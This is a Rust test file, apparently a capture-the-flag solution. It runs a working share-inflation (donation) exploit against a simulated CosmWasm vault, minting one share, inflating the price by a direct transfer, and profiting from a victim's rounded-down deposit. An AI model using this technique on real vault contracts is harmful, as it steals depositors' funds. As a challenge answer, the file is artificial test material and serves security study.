#[cfg(test)]
pub mod exploit {
    use crate::{
        contract::DENOM,
        integration_tests::tests::{base_scenario, PLAYER, VICTIM},
        msg::{ExecuteMsg, QueryMsg},
        state::Balance,
    };
    use cosmwasm_std::{coin, Addr, Uint128};
    use cw_multi_test::Executor;

    #[test]
    fn exploit() {
        // let's break the invariant `total_assets / total_supply = 1`

        let (mut app, contract_addr) = base_scenario();

        let player_addr = Addr::unchecked(PLAYER);
        let player_initial_balance = app
            .wrap()
            .query_balance(player_addr.clone(), DENOM)
            .unwrap();
        let victim_addr = Addr::unchecked(VICTIM);
        let victim_initial_balance = app
            .wrap()
            .query_balance(victim_addr.clone(), DENOM)
            .unwrap();

        app.execute_contract(
            player_addr.clone(),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[coin(1, DENOM)],
        )
        .unwrap();

        app.send_tokens(
            player_addr.clone(),
            contract_addr.clone(),
            &[coin(
                (victim_initial_balance.amount / Uint128::new(2)).u128(),
                DENOM,
            )],
        )
        .unwrap();

        app.execute_contract(
            victim_addr,
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        let token_balance: Balance = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::UserBalance {
                    address: player_addr.to_string(),
                },
            )
            .unwrap();

        app.execute_contract(
            player_addr.clone(),
            contract_addr.clone(),
            &ExecuteMsg::Burn {
                shares: token_balance.amount,
            },
            &[],
        )
        .unwrap();

        let balance = app.wrap().query_balance(player_addr, DENOM).unwrap();
        let profit = balance.amount - player_initial_balance.amount;
        assert!(profit > Uint128::zero());
        println!("Profit: {}", profit);
    }
}
